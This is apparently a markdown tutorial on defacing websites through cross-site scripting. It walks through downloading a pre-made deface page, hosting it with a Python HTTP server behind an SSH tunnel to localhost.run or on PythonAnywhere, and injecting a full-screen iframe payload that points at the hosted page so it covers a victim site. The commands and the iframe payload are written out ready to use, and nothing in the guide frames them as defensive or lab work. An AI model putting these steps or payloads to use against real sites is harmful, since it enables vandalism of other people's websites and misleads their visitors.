# üöÄ How to Host a Deface Page and Use it in an `<iframe>` XSS Payload


## **Step 1: Download the Deface HTML Page**



* Go to the following URL to download a pre-designed deface page:

  ```
  https://deface.prinsh.com/#home
  ```
* Save the downloaded file (usually named `deface.html`) to your desired directory.


## **Step 2: Rename the HTML File to `index.html`**

* Open your terminal in the directory where the file is saved.
* Run the following command to rename the file:

  ```bash
  mv deface.html index.html
  ```

# Hosting and Port Forwarding of deface website

Hosting a Defaced websites are typically hosted on a local server, and port forwarding might be used to make the website accessible from the internet

# By Using Localhost.run (Temporary Hosting) ‚öúÔ∏è

## **Step 3: Start a Local Python HTTP Server**

* In the same directory, start a simple HTTP server using Python:

  ```bash
  python3 -m http.server
  ```
* By default, this will host the contents of the current folder at:

  ```
  http://localhost:8000
  ```


## **Step 4: Port Forward the Local Server Using SSH Tunneling**

* Use the following command to expose your local server to the internet:

  ```bash
  ssh -R 80:localhost:8000 nokey@localhost.run
  ```
* After a few seconds, you will get a public URL like:

  ```
  https://<random>.lhr.life
  ```



## **Step 5: Use the Public URL Inside an XSS `<iframe>` Payload**

* Insert the forwarded URL inside an `<iframe>` tag to embed your deface page in an XSS attack:

  ```html
  <iframe src="https://70cd7efcbcf713.lhr.life" 
  style="border: 0; position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%;">
  </iframe>
  ```

### üîπ Step 1: Upload Your `index.html` File

* Go to:
  üëâ [https://www.pythonanywhere.com/](https://www.pythonanywhere.com/)
  
* Click **Upload a file**.
* Upload your `index.html` file

### üîπ Step 2: Configure Web App to Serve Static Files

1. Go to the [**Web tab**](https://www.pythonanywhere.com/user/<username>/webapps/) of your dashboard.

2. If you don't have a web app yet, click **"Add a new web app"**:

   * Choose: `Manual configuration (Python 3.x)`
   * Choose: `Flask` (we'll override this to serve static files only)
   * Domain: `ramed80048.pythonanywhere.com`

3. Scroll down to **"Static files"** section:

   * Add a new entry:

     ```
     URL: /      Directory: /home/<your-Username>/

### ‚úÖ Done!

Now open your web app:

üëâ [https://<your-Username>.pythonanywhere.com](https://<your-Username>.pythonanywhere.com)

This will directly show your `index.html` file and you can use this **HTTPS** URL in your `<iframe>` XSS payload:
Replace 'src=' link

 
```html
<iframe src="https://ramed80048.pythonanywhere.com" 
style="border: 0; position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%;">
</iframe>
```
